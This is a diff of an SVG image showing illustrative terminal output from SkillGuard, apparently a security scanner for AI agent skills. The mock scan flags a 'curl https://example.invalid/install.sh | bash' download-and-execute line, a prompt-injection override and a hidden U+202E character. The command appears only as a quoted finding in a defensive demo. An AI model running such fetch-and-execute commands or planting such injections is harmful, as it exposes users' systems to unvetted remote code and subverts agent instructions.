@@ -1,26 +1,28 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="1200" height="560" viewBox="0 0 1200 560" role="img" aria-labelledby="title desc">
   <title id="title">SkillGuard terminal demo</title>
-  <desc id="desc">Illustrative static terminal output. Not a real scan result.</desc>
-  <rect width="1200" height="560" rx="24" fill="#0b1220"/>
+  <desc id="desc">Illustrative SkillGuard scan output showing prompt injection, a secret, and a download-and-execute warning.</desc>
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#111827"/><stop offset="1" stop-color="#0b1220"/></linearGradient>
+  </defs>
+  <rect width="1200" height="560" rx="24" fill="url(#bg)"/>
   <rect x="1" y="1" width="1198" height="558" rx="23" fill="none" stroke="#334155" stroke-width="2"/>
   <path d="M24 0h1152a24 24 0 0 1 24 24v46H0V24A24 24 0 0 1 24 0Z" fill="#1e293b"/>
   <circle cx="34" cy="35" r="8" fill="#fb7185"/><circle cx="62" cy="35" r="8" fill="#fbbf24"/><circle cx="90" cy="35" r="8" fill="#34d399"/>
-  <g font-family="ui-monospace,monospace">
-    <text x="600" y="43" fill="#cbd5e1" font-size="18" text-anchor="middle">skillguard · security audit</text>
-    <text x="42" y="128" fill="#e2e8f0" font-size="25" font-weight="700">$ skillguard ./sample-skill</text>
-    <text x="42" y="180" fill="#f87171" font-size="28" font-weight="700">25/100</text>
-    <text x="172" y="180" fill="#cbd5e1" font-size="22">Grade F · 4 files · 3 findings</text>
-    <text x="42" y="220" fill="#94a3b8" font-size="18">Critical 1   High 2   Medium 0   Low 0</text>
-    <path d="M42 245h1116" stroke="#334155"/>
-    <text x="42" y="290" fill="#fb7185" font-size="20" font-weight="700">CRITICAL SG006</text>
-    <text x="285" y="290" fill="#e2e8f0" font-size="19">scripts/setup.sh:12</text>
-    <text x="64" y="324" fill="#cbd5e1" font-size="17">Remote content is downloaded and piped directly to a shell.</text>
-    <text x="64" y="352" fill="#94a3b8" font-size="17">curl https://example.invalid/install.sh | bash</text>
-    <text x="42" y="410" fill="#fbbf24" font-size="20" font-weight="700">HIGH SG003</text>
-    <text x="210" y="410" fill="#e2e8f0" font-size="19">SKILL.md:18</text>
-    <text x="64" y="444" fill="#cbd5e1" font-size="17">Prompt-injection style instruction override detected.</text>
-    <text x="42" y="500" fill="#fbbf24" font-size="20" font-weight="700">HIGH SG001</text>
-    <text x="210" y="500" fill="#e2e8f0" font-size="19">SKILL.md:24</text>
-    <text x="64" y="530" fill="#cbd5e1" font-size="17">Hidden bidirectional Unicode character found (U+202E).</text>
-  </g>
+  <text x="600" y="42" fill="#cbd5e1" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="18" text-anchor="middle">skillguard » security audit</text>
+  <text x="42" y="118" fill="#e2e8f0" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="25" font-weight="700">$ skillguard ./sample-skill</text>
+  <text x="42" y="168" fill="#f87171" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="28" font-weight="700">25/100</text>
+  <text x="172" y="168" fill="#cbd5e1" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="22">Grade F · 4 files · 3 findings</text>
+  <text x="42" y="205" fill="#94a3b8" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="18">Critical 1   High 2   Medium 0   Low 0</text>
+  <line x1="42" y1="232" x2="1158" y2="232" stroke="#334155"/>
+  <text x="42" y="278" fill="#fb7185" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="20" font-weight="700">CRITICAL  SG006</text>
+  <text x="285" y="278" fill="#e2e8f0" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="19">scripts/setup.sh:12</text>
+  <text x="64" y="311" fill="#cbd5e1" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="17">Remote content is downloaded and piped directly to a shell.</text>
+  <text x="64" y="340" fill="#94a3b8" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="17">curl https://example.invalid/install.sh | bash</text>
+  <text x="42" y="390" fill="#fbbf24" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="20" font-weight="700">HIGH  SG003</text>
+  <text x="210" y="390" fill="#e2e8f0" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="19">SKILL.md:18</text>
+  <text x="64" y="423" fill="#cbd5e1" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="17">Prompt-injection style instruction override detected.</text>
+  <text x="42" y="478" fill="#fbbf24" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="20" font-weight="700">HIGH  SG001</text>
+  <text x="210" y="478" fill="#e2e8f0" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="19">SKILL.md:24</text>
+  <text x="64" y="511" fill="#cbd5e1" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="17">Hidden bidirectional Unicode character found (U+202E).</text>
+  <text x="1156" y="538" fill="#64748b" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="12" text-anchor="end">Illustrative output — not a real scan result</text>
 </svg>
